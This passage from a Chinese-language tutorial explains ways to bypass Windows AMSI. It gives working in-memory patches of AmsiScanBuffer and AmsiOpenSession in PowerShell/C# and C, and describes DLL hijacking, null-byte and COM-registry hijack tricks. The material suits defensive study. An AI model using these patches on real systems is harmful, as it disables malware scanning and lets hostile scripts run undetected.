    .dll");
    IntPtr addr = GetProcAddress(lib, String.Join(""
    ,
    b.Reverse().ToArray()));
    uint old = 0;
    byte[] p;
    p = new byte[6];
    p[0] = 0xB8;
    p[1] = 0x57;
    p[2] = 0x00;
    p[3] = 0x07;
    p[4] = 0x80;
    p[5] = 0xc3;
    VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
    Marshal.Copy(p, 0, addr, p.Length);
    VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
    }
    "@
    Add-Type $p
    [Program]::Bypass()
这段码的功能就是在`AmsiScanBuffer`的函数地址处直接打补丁，补丁汇编是：
    mov eax,0x80070057
    ret
`0x80070057`也就是`-2147024809`，是一个负数，当然也可以是其他负数，而`AmsiScanBuffer`也可以修  
改成`AmsiOpenSession`。怎么把汇编代码转换成代码中的数组呢？使用
    $p=@"
    using System;
    using System.Linq;
    using System.Runtime.InteropServices;
    public class Program
    {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpfloldProtect);
    public static void Bypass()
    {
    String a =
    "isma";
    IntPtr lib = LoadLibrary(String.Join(""
    , a.Reverse().ToArray()) +
    "
    .dll");
    IntPtr addr = GetProcAddress(lib,
    "AmsiOpenSession");
    uint old = 0;
    byte[] p;
    p = new byte[6];
    p[0] = 0xB8;
    p[1] = 0xFF;
    p[2] = 0xFF;
    p[3] = 0xFF;
    p[4] = 0xFF;
    p[5] = 0xC3;
    VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
    Marshal.Copy(p, 0, addr, p.Length);
    VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
        }
    }
    "@
    Add-Type $p
    [Program]::Bypass()
我们修改了被打补丁的函数为AmsiOpenSession,补丁汇编代码为:
    mov eax,-1
    ret
我们知道了补丁函数可以为AmsiOpenSession、AmsiScanBuffer，补丁代码可以变化很  
多，只要返回结果为负数就行。
    #include 
    #include 
    int main() {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        CreateProcessA(NULL, (LPSTR)"powershell -NoExit dir", NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        Sleep(500);
        DWORD oldProtect;
        char patch = 0xc3;
        VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &patch, sizeof(char), NULL);
        VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        FreeLibrary(hAmsi);
        return 0;
    }
0xc3的硬编码对应的汇编是ret，也就是调用AmsiScanBuffer直接让他返回。这个马是直接被杀的。
## 非主流对抗
### 1.劫持amsi.dll
### 原理
由于研发人员使用 LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll
因此我们在 powershell.exe同目录下放一个amsi.dll做劫持
    amsi.dll`的默认目录：`c:\windows\system32\amsi.dll
还要考虑`amsi.dll`的导出函数，使用 Aheadlib工具生成或者自己找到 amsi.dll
对应的导出函数，自己写，一样的。当然自己的dll没有签名，这里还涉及到免杀的问题，如果可以添加微软前面，再劫持，又有很大的可玩性。
### 2.NULL字符绕过
这个方法已经失效了，但还是提一下，扩充下思路。
Amsi扫描使用的是 `AmsiScanString`函数
    HRESULT WINAPI AmsiScanString(
    _In_ HAMSICONTEXT amsiContext,
    _In_LPCWSTR string, // Will be terminated at the first null
    character
    _In_LPCWSTR contentName,
    _In_opt_HAMSISESSION session,
    _Out_AMSI_RESULT *result
    );
其中string就是脚本内容，在执行脚本之前加个空字符就可以截断，而修复的方法是用了
`AmsiScanBuffer`这个函数，所以amsi才会用这两个函数来扫描
    HRESULT WINAPI AmsiScanBuffer(
    _In_    HAMSICONTEXT amsiContext,
    _In_    PVOID buffer, // Not terminated at the null character
    _In_    ULONG length,
    _In_    LPCWSTR contentName,
    _In_    opt_HAMSISESSION session,
    _Out_   AMSI_RESULT *result
    );
### 3.COM server劫持
原理：amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先  
从注册表HKCU中找对应的dll去解析，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了。简单来说利用的是注册表优先级来绕过。
    Windows Registry Editor Version 5.00
    [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-    4357bb0072ec}]
    [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
    @="C:\\goawayamsi.dll"
而微软通过直接调用amsi.dll 的 `DllGetClassObject()` 函数替换 `CoCreateInstance()`，  
可以避免注册表解析。
但是这种方法也失效了，不过可以学习下思路。
## 最后
AMSI 也还是有更多的方向可以研究，混淆等等 但更了解powershell 对于bypass有更好的帮助
还一个平台可参考用用
在线生成的平台
参考:
> 《Bypass AMSI的前世今生》by L.N.